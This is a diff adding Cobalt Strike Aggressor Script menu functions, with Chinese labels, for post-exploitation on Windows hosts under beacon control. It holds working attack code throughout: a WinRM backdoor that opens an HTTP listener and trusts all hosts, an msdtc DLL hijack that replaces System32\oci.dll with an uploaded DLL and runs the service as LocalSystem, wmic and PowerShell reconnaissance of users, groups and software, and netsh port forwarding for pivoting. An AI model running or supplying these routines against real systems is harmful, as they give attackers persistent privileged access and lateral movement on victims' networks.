@@ -25,6 +25,100 @@ sub servicerun{
 	}
 }
 
+sub winrm_set{
+	if ($3['bid']) {
+		btask($bid ,"setting winrm");
+		bshell($bid, "winrm quickconfig -q");
+		bshell($bid, 'winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}');
+		bshell($bid, "winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=\"$3['port']\"}");
+		bshell($bid, "winrm set winrm/config/Client @{TrustedHosts=\"*\"}");
+		btask($bid, "winrm config");
+		bshell($bid, "winrm e winrm/config/listener");
+	#	btask($bid,"客户端连接使用：winrm quickconfig -q\nwinrm set winrm/config/Client @{TrustedHosts="*"}\nwinrs -r:<ip>:<port> -u:<user> -p:<password> <command>\nExample:winrs -r:http://127.0.0.1:80 -u:administrator -p:123456 whoami");
+	}else{
+		berror($3['bid'], "Not an administrator");
+	}
+}
+
+sub winrm_config{
+	$dialog = dialog("Winrm config", %(port => "80", bid => $bid), &winrm_set);
+	dialog_description($dialog, "winrm后门端口设置\nwindows server 2008或以下端口默认为80端口(端口复用)，无法进行修改");
+	drow_text($dialog, "port", "port:");
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
+}
+
+
+sub usbhistory{
+	bpowerpick($bid, "Get-ItemProperty -Path HKLM:\\SYStem\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select FriendlyName");
+}
+
+sub checkdomain{
+	bpowerpick($bid, "\$domain=(((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq \$False ) -or ( -not  \$Env:USERDNSDOMAIN);write-Host \"是否有域(True/False):\"\$domain");
+}
+
+sub deviceget{
+	bshell($bid, "wmic logicaldisk get deviceid,FileSystem");
+}
+
+sub getinstall{
+	bshell($bid, "wmic product get name");
+}
+
+
+sub getosinfo{
+	bshell($bid, "wmic os get name,Version,OSArchitecture");
+}
+
+
+sub nicconfiginfo{
+	bshell($bid, "wmic NICCONFIG get Description,IPAddress,IPSubnet,MACAddress,DHCPServer");
+}
+
+
+sub computergetinfo{
+	bshell($bid, "wmic COMPUTERSYSTEM get UserName,Workgroup,SystemFamily");
+	bshell($bid, "wmic cpu get Name,AddressWidth");
+	bshell($bid, "wmic MEMORYCHIP get PartNumber,Capacity,Speed");
+}
+
+sub usergetinfo{
+	bshell($bid, "wmic USERACCOUNT get Name,Domain,SID,Disabled,PasswordChangeable,PasswordRequired");
+}
+
+sub groupgetinfo{
+	bshell($bid, "wmic group get Description,Name,SID");
+}
+
+sub msdtc_config{
+	$dll = $3['file'];
+	$name = split("\\\\", $dll);
+	$dllname = $name[-1];
+	$dllname_w = $3['file2']."\\\\oci.dll";
+	foreach $id ($bid){
+		if(-isadmin $id){
+			btask($id, "配置msdtc dll劫持");
+			bshell($id, "taskkill /F /IM msdtc.exe");
+			bshell($id, "del C:\\Windows\\System32\\oci.dll /F");
+			bupload($id, $dll);
+			bmv($id, $dllname, $dllname_w);
+			bshell($id, "sc config msdtc obj= LocalSystem");
+			bshell($id, "sc start msdtc");
+		}else{
+			btask($id, "不是Administrator权限");
+		}
+	}
+}
+
+sub msdtc{
+	$dialog = dialog("msdtc DLL hijack config", %(file => "",file2 => "C:\\Windows\\System32"), &msdtc_config);
+	dialog_description($dialog, "msdtc DLL劫持,将DLL名称改为");
+	drow_file($dialog, "file", "DLL Path:");
+	drow_text($dialog, "file2", "RHOST Path:");
+	dbutton_action($dialog, "RUN");
+	dialog_show($dialog);
+}
+
 
 popup beacon_bottom{
 	menu "&权限维持"{
@@ -39,6 +133,121 @@ popup beacon_bottom{
 			drow_listener($dialog, "listener", "Listener: ");
 			dbutton_action($dialog, "run");
 			dialog_show($dialog);
+		}
+
+		item "&winrm后门"{
+			$bid = $1;
+			winrm_config($bid);
+		}
+
+		item "&msdtc DLL劫持"{
+			$bid = $1;
+			msdtc($bid);
+
+		}
+
+	}
+
+}
+
+sub netsh_exec{
+	if ($set eq "port"){
+		$lhost = $3['lhost'];
+		$rhost = $3['rhost'];
+		$lport = $3['lport'];
+		$rport = $3['rport'];
+		foreach $id ($bid){
+			btask($id, "端口转发:$lhost : $lport -> $rhost : $rport");
+			bshell($id, "netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost");
+			btask($id, "查看端口转发列表");
+			bshell($id, "netsh interface portproxy show all");
+
+		}
+	}else{
+		$lhost = $3['lhost'];
+		$lport = $3['lport'];
+		foreach $id ($bid){
+			btask($id, "删除端口转发：$lhost : $lport");
+			bshell($id, "netsh interface portproxy delete v4tov4 listenport=$lport listenaddress=$lhost");
+			btask($id, "查看端口转发列表");
+			bshell($id, "netsh interface portproxy show all");
+		}
+	}
+}
+
+sub netsh_poort{
+	$dialog = dialog("netsh Port",%(lhost => "127.0.0.1",  rhost => "192.168.1.2", lport => "4444", rport => "4444"), &netsh_exec);
+	dialog_description($dialog, "netsh端口转发配置\nnetsh端口转发删除");
+	if ($set eq "port"){
+		drow_text($dialog, "lhost", "LHOST:");
+		drow_text($dialog, "rhost", "RHOST:");
+		drow_text($dialog, "lport", "LPORT:");
+		drow_text($dialog, "rport", "RPORT:");
+	}else{
+		drow_text($dialog, "lport", "LPORT:");
+		drow_text($dialog, "lhost", "LHOST:");
+	}
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
+
+}
+
+
+popup beacon_bottom{
+	menu "&信息收集"{
+		$bid = $1;
+		item "&usb历史记录信息收集"{
+			usbhistory($bid);
+		}
+
+		item "&判断是否存在域"{
+			checkdomain($bid);
+		}
+
+		item "&获取系统盘符"{
+			deviceget($bid);
+		}
+
+		item "&已安装的软件"{
+			getinstall($bid);
+		}
+
+		item "&系统基本信息获取"{
+			getosinfo($bid);
+		}
+
+		item "&网络信息查询"{
+			nicconfiginfo($bid);
+		}
+
+		item "&配置查询"{
+			computergetinfo($bid);
+		}
+
+		item "&用户查询"{
+			usergetinfo($bid);
+		}
+
+		item "&用户组查询"{
+			groupgetinfo($bid);
+		}
+
+		menu "&netsh"{
+			item "&netsh端口转发设置"{
+				$set ="port";
+				netsh_poort($bid, $port);
+			}
+
+			item "&netsh端口转发列表查询"{
+				foreach $id ($bid){
+					bshell($id, "netsh interface portproxy show all");
+				}
+			}
+
+			item "&netsh端口转发删除"{
+				$set = "delete";
+				netsh_poort($bid, $set);
+			}
 		}
 	}
 }
